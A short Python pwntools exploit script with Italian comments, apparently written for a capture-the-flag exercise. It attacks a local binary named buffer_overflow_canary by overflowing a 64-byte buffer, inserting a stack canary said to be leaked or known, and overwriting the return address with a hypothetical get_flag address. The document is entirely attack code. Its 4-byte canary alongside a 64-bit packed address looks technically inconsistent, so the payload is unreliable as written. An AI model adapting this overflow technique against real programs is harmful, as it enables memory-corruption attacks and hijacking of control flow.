from pwn import *

# Connessione al servizio remoto o locale
p = process('./buffer_overflow_canary')

# Ricevi la stringa di benvenuto
p.recvuntil("Inserisci il tuo input: ")

# Creazione del payload
# Prima riempiamo il buffer, poi aggiungiamo il canary (ipotizziamo di conoscerlo), quindi il riempimento e infine l'indirizzo di get_flag
buffer_size = 64
padding = b"A" * buffer_size

# Canary leakato o conosciuto (ipotetico)
canary = b"\x00\x12\x34\x56"

# Riempiamo fino al return address
padding_after_canary = b"B" * 8

# Indirizzo di get_flag (ipotetico, deve essere trovato con gdb)
get_flag_address = p64(0x400626)

# Costruiamo il payload finale
payload = padding + canary + padding_after_canary + get_flag_address

# Inviamo il payload
p.sendline(payload)

# Vediamo la flag
p.interactive()
